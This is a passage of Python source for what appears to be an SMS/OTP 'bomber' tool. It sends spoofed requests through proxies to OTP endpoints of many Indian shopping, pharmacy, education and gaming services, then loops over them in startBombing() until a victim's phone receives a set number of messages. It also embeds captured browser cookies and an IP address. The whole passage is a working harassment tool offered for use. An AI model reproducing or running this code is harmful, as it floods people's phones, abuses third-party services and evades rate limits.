            'x-requested-with': "XMLHttpRequest"
        }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, params=querystring, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def whatjrcall(self):
        url = "https://api.whitehatjr.com/api/V1/otp/generate"

        querystring = {"deviceId": "4332e125-c772-4321-a79a-8930d1d34c53", "timezone": "Asia/Calcutta", "trackingCode": "trackingCode|AB-11164-V-A|AB-11194-V-B|AB-11169-V-B|AB-11140-V-A|AB-11159-V-A|AB-11137-V-A|AB-11167-V-A|AB-11182-V-A|AB-11186-V-A|AB-11150-V-B|AB-11192-V-A|AB-22-V-B|AB-11183-V-B|AB-29-V-B|AB-11142-V-A|AB-11188-V-B|AB-11151-V-B|AB-11200-V-A|AB-24-V-C|AB-11154-V-A|AB-11152-V-A|AB-11166-V-A|AB-11195-V-A|AB-26-V-B|AB-11136-V-A|AB-13-V-B|AB-11198-V-A|AB-11196-V-A|AB-18-V-A|AB-11193-V-B|AB-11184-V-A|AB-31-V-A|AB-11191-V-B|AB-11181-V-B|AB-11176-V-B|AB-34-V-A|AB-28-V-B|AB-11156-V-A|AB-15-V-A|AB-11163-V-A|AB-11204-V-A|AB-11201-V-B|AB-25-V-B|AB-11155-V-A|AB-11135-V-A|AB-11161-V-A|AB-21-V-C|AB-11202-V-A|AB-17-V-A|AB-37-V-A|AB-23-V-C|AB-11153-V-A|AB-11165-V-A|AB-11175-V-A|AB-12-V-A|AB-11160-V-B|AB-27-V-B", "regionId": "IN", "courseType": "ALL", "brandId": "whitehatjr", "timestamp": "1654659858746", "_vercel_no_cache": "1"}

        payload = "{\"dialCode\":\"+91\",\"mobile\":"f'"{self.user_mobile}"'",\"type\":\"voice\"}"
        headers = {
            'authority': "api.whitehatjr.com",
            'accept': "application/json, text/plain, */*",
            'accept-language': "en-US,en;q=0.9",
            'content-type': "application/json;charset=UTF-8",
            'cookie': "deviceId=4332e115-c772-4321-a79a-8930d1d34c53; URLParams=%7B%22gclid%22%3A%22CjwKCAjw7vuUBhBUEiwAEdu2pErCSRkGEAIX-0iRiz9bO11D0fDxQley6w2HbQXcKrRYSk3_nU-AGBoCYpEQAvD_BwE%22%2C%22utm_medium%22%3A%22138787040051%22%2C%22utm_term%22%3A%22580981415654%22%2C%22utm_content%22%3A%22Whitehat_Exact%22%2C%22utm_source%22%3A%22Google_IND_SearchB%22%2C%22utm_campaign%22%3A%22IND_SOK_ACQ_Whitehat_Search_Brand_Booked_Exact%22%7D; abTests=trackingCode%7CAB-11164-V-A%7CAB-11194-V-B%7CAB-11169-V-B%7CAB-11140-V-A%7CAB-11159-V-A%7CAB-11137-V-A%7CAB-11167-V-A%7CAB-11182-V-A%7CAB-11186-V-A%7CAB-11150-V-B%7CAB-11192-V-A%7CAB-22-V-B%7CAB-11183-V-B%7CAB-29-V-B%7CAB-11142-V-A%7CAB-11188-V-B%7CAB-11151-V-B%7CAB-11200-V-A%7CAB-24-V-C%7CAB-11154-V-A%7CAB-11152-V-A%7CAB-11166-V-A%7CAB-11195-V-A%7CAB-26-V-B%7CAB-11136-V-A%7CAB-13-V-B%7CAB-11198-V-A%7CAB-11196-V-A%7CAB-18-V-A%7CAB-11193-V-B%7CAB-11184-V-A%7CAB-31-V-A%7CAB-11191-V-B%7CAB-11181-V-B%7CAB-11176-V-B%7CAB-34-V-A%7CAB-28-V-B%7CAB-11156-V-A%7CAB-15-V-A%7CAB-11163-V-A%7CAB-11204-V-A%7CAB-11201-V-B%7CAB-25-V-B%7CAB-11155-V-A%7CAB-11135-V-A%7CAB-11161-V-A%7CAB-21-V-C%7CAB-11202-V-A%7CAB-17-V-A%7CAB-37-V-A%7CAB-23-V-C%7CAB-11153-V-A%7CAB-11165-V-A%7CAB-11175-V-A%7CAB-12-V-A%7CAB-11160-V-B%7CAB-27-V-B; AB_DATA_GENERATED=true; feGeneratedDeviceId=false; ajs_anonymous_id=%22ae055dcb-75c3-4be6-ae6b-2bacc6bf4ec2%22; _scid=17a15132-4df7-46e2-a07c-ceb35d48a5fd; _gcl_au=1.1.2049152166.1654659669; _gcl_aw=GCL.1654659670.CjwKCAjw7vuUBhBUEiwAEdu2pErCSRkGEAIX-0iRiz9bO11D0fDxQley6w2HbQXcKrRYSk3_nU-AGBoCYpEQAvD_BwE; _ga=GA1.1.272570046.1654659670; _ga_G1JDQQ3VRY=GS1.1.1654659669.1.0.1654659670.59; _uetsid=d62480a0e6dc11ecb8a4f136ceb600a8; _uetvid=18684ca0a7ff11eca3286f63df1f1e05; _hsu=hs.1654659670215.753036eabb; _hscl=; _tt_enable_cookie=1; _ttp=6a4a3a33-a9be-4c5e-8618-f24ad9ef2cd3; _sctr=1|1654626600000; voxusmediamanager_ignore=true; voxusmediamanager_ignoreot_full=true; voxusmediamanager_id=16546596738640.9900373382273613a8nb0r5rgy8; voxusmediamanager__ip=103.240.76.144; _dd_s=logs=1&id=1447bbf7-abbd-4413-9e1b-44c553ee7100&created=1654659664183&expire=1654660758684&rum=0",
            'dnt': "1",
            'origin': "https://code.whitehatjr.com",
            'referer': "https://code.whitehatjr.com/",
            'sec-fetch-dest': "empty",
            'sec-fetch-mode': "cors",
            'sec-fetch-site': "same-site",
            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.33",
            'whjr-amplitude-sessionid': "0",
            'whjr-segment-anonymousid': "ae055dcb-75c3-4be6-ae6b-2bacc6bf4ec2"
        }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, params=querystring, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def startBombing(self):

        if(self._checkinternet()):
            counter = 0
            while True:
                if self.flipkart():
                    counter += 1
                if self.confirmtkt():
                    counter += 1
                if self.lenskart():
                    counter += 1
                if self.justdial():
                    counter += 1
                if self.apolopharmacy():
                    counter += 1
                if self.apolopharmacy():
                    counter += 1
                if self.unacademy():
                    counter += 1
                if self.snapdeal():
                    counter += 1
                if self.jiomart():
                    counter += 1
                if self.upchar():
                    counter += 1
                if self.tata():
                    counter += 1
                if self.snapdeal():
                    counter += 1
                if self.pharmeasy():
                    counter += 1
                if self.okcredit():
                    counter += 1
                if self.naaptol():
                    counter += 1
                if self.lenskart():
                    counter += 1
                if self.justdial():
                    counter += 1
                if self.jobhai():
                    counter += 1
                if self.jiomart():
                    counter += 1
                if self.indiamart():
                    counter += 1
                if self.icq():
                    counter += 1
                if self.dealshare():
                    counter += 1
                if self.confirmtkt():
                    counter += 1
                if self.ajio():
                    counter += 1
                if self.onecard():
                    counter += 1
                if self.kreditBee():
                    counter += 1
                if self.dMart():
                    counter += 1
                if self.purplle():
                    counter += 1
                if self.openBook():
                    counter += 1
                if self.eka():
                    counter += 1
                if self.olx():
                    counter += 1
                if self.netmeds():
                    counter += 1
                if self.classicRummy():
                    counter += 1
                if self.classicRummy2():
                    counter += 1
                if self.nnow():
                    counter += 1
                if self.gamezy():
                    counter += 1
                if self.gamezzy():
                    counter += 1
                if self.upstocks():
                    counter += 1
                if self.whitehatjr():
                    counter += 1
                if self.byjus():
                    counter += 1
                if self.playerzpot():
                    counter += 1
                if self.westside():
                    counter += 1
                if self.appolo():
                    counter += 1
                if self.khatabook():
                    counter += 1
                if self.playrummy():
                    counter += 1
                if self.redbus():
                    counter += 1
                if self.decathon():
                    counter += 1
                if self.khelplay():
                    counter += 1
                if self.whatjrcall():
                    counter += 1

                if(counter >= self.number_of_messege):
                    break

            # ["flipkart","confirmtkt","lenskart","justdial","indialends","apolopharmacy","magicbrick","ajio","mylescars","unacademy","snapdeal", "jiomart"]:
        else:
            print("possible errors -  Internet connectivity")


# shiprocketsocial,valueshoppe,housing.com,hoststar,byju,altbalaji,
